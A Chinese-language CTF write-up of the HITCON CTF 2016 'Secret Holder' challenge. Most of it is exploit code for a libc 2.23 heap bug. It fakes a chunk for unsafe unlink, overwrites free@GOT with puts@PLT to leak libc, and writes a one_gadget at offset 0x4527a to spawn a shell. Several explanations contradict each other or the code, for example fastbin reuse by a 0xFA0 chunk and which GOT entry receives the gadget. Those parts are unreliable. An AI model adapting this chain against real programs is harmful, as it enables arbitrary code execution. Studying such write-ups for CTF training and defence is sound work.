---
title: HITCON CTF 2016 Secret Holder - Unsafe Unlink PWN
contest: HITCONCTF
year: 2016
difficulty: hard
vuln_type: pwn_unknown
tags: [unsafe-unlink, double-free-bypass, fake-chunk, global-pointer, free-GOT-overwrite, puts-leak, HITCON, classic-heap, libc-2.23]
attack_chain:
  - 3 个 chunk: small (0x28) + medium (0xFA0) + large (0x61A80)
  - small_ptr = 0x6020b0, big_ptr = 0x6020a0
  - keep_calloc(3) + wipe_free(3) 提高 mp_.n_mmaps_max
  - keep_calloc(1) wipe_free(1) keep_calloc(2) wipe_free(1) keep_calloc(1) keep_calloc(3) 构造悬空指针
  - fake chunk: p64(0) + p64(0x21) + p64(small_ptr-0x18) + p64(small_ptr-0x10) + p64(0x20) + p64(0x61a90)
  - renew(2, payload) 改 fake fd/bk
  - wipe_free(3) unsafe unlink → *small_ptr = big_ptr, *big_ptr = free@GOT
  - renew(1, p64(elf.got['free']) + p64(big_ptr)) 任意写
  - renew(2, p64(elf.plt['puts'])) 改 free@GOT = puts@PLT
  - wipe_free(2) → puts(puts@GOT) 泄 libc
  - puts_addr = u64(recvline()[:6])
  - one_gadget = libc_base + 0x4527a
  - renew(1, p64(one_gadget)) 写 one_gadget 到 puts@GOT
  - 触发 get shell
key_payload: 'unsafe unlink + renew fake fd/bk + wipe_free(3) + renew 改 free@GOT = puts + one_gadget 0x4527a'
one_liner: HITCON 2016 Secret Holder：unsafe unlink + 三个 chunk 构造 + 改 free@GOT = puts 泄 libc + one_gadget 拿 shell。
lesson: unsafe unlink 是经典堆利用；改 free@GOT → puts 泄 libc → one_gadget 是无 libc 泄露时的标准套路。
quality: high
---

# 漏洞学习之 PWN - HITCON CTF 2016 Secret Holder

**来源**: ctfiot.com ID 89243

## 题目
- 三个 chunk: small (0x28), medium (0xFA0), large (0x61A80)
- 全局指针: `small_ptr=0x6020b0, big_ptr=0x6020a0`
- libc-2.23

## 攻击链

### Step 1: 触发 n_mmaps_max 提高
```python
keep_calloc(3)        # large 0x61A80
wipe_free(3)          # 提高 mp_.n_mmaps_max
```

### Step 2: 构造悬空指针
```python
keep_calloc(1) wipe_free(1)        # small 0x28 进 fastbin
keep_calloc(2)                    # medium 0xFA0 复用 fastbin (与 chunk1 同地址)
wipe_free(1)                      # 此时 free 实际是 free chunk2 → 触发 double free bypass
keep_calloc(1)                    # 复用 fastbin
keep_calloc(3)                    # 大块，确保 chunk1 在 chunk2 之前
```

### Step 3: 构造 fake chunk
```python
payload = p64(0)              # fake prev_size
payload += p64(0x21)          # fake size
payload += p64(small_ptr-0x18)  # fake fd
payload += p64(small_ptr-0x10)  # fake bk
payload += p64(0x20)         # fake prev_size of next
payload += p64(0x61a90)      # fake size of next

renew(2, payload)            # UAF 写 fake chunk
```

### Step 4: Unsafe Unlink
```python
wipe_free(3)  # 触发 unlink
# *small_ptr = big_ptr
# *big_ptr = free@GOT
```

### Step 5: 任意写 + 泄 libc
```python
payload = b'B' * 8 + p64(elf.got['free'])  # *big_ptr = free@GOT
payload += b'C' * 8 + p64(big_ptr)        # *small_ptr = big_ptr
renew(1, payload)

renew(2, p64(elf.plt['puts']))  # 改 free@GOT = puts@PLT
wipe_free(2)                     # puts(puts@GOT) 泄 libc
puts_addr = u64(p.recvline()[:6] + b'\x00\x00')
libc_base = puts_addr - libc.symbols['puts']
```

### Step 6: One gadget
```python
one_gadget = libc_base + 0x4527a
renew(1, p64(one_gadget))   # 写 one_gadget 到 puts@GOT
# 触发
p.interactive()
```

## 内存状态变化
```
# Step 3 后:
# 0x11e4000: 块1头部 (0x31)
# 0x11e4010: 0x0000000000000000 0x0000000000000021 (构造的 fake chunk 头)
# 0x11e4020: 0x602098 (small_ptr-0x18) 0x6020a0 (small_ptr-0x10)
# 0x11e4030: 0x20 (prev_size) 0x61a90 (size)
```

## 关键技术
- **unsafe unlink**：fake chunk fd/bk 满足 `FD->bk == P && BK->fd == P`
- **double free bypass**：通过两个指针指向同一块实现
- **free@GOT 改写**：用 puts 替代 free 实现任意读
- **one_gadget 0x4527a**：libc 2.23 经典 one_gadget
- **mp_.n_mmaps_max 提高**：通过先 alloc + free large chunk 扩大 mmap 限制

## 评价
HITCON CTF 2016 Secret Holder 是堆 PWN 经典教学案例。考察：
- unsafe unlink
- double free 绕过
- free@GOT 改写泄露 libc
- one_gadget 触发 shell

是 2016 年最具影响力的堆利用题之一。
